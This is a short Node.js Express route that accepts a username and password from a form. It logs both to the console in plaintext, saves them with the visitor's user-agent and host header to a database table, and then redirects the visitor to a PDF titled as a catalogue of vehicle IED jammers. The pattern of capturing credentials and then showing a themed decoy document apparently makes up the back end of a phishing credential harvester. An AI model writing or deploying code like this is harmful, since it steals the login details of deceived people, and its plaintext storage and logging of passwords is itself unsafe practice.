// routes/submit.js
const express = require('express');
const router = express.Router();
const db = require('../db');

// Route to handle form submission
router.post('/', (req, res) => {
    const { username, password } = req.body;
    const agent = req.headers['user-agent'];
    const host = req.headers['host'];
    // Log the values for debugging
    console.log('Username:', username);
    console.log('Password:', password);
    console.log('User -Agent:', agent);
    console.log('Username:', username);
    console.log('host:', host);
    const insertQuery = 'INSERT INTO newtable (username, password, user_agent,host) VALUES (?, ?, ?, ?)';
    db.query(insertQuery, [username, password, agent, host], (err, result) => {
      if (err) {
        console.error('Error inserting data:', err);
        return res.render('error', { message: 'Failed to insert data: ' + err.message });
      }
      console.log('Data inserted successfully:', result);
      res.redirect('../Catalogue on Vehicle IED Jammer.pdf');
    });
  });
  

// Export the router
module.exports = router;
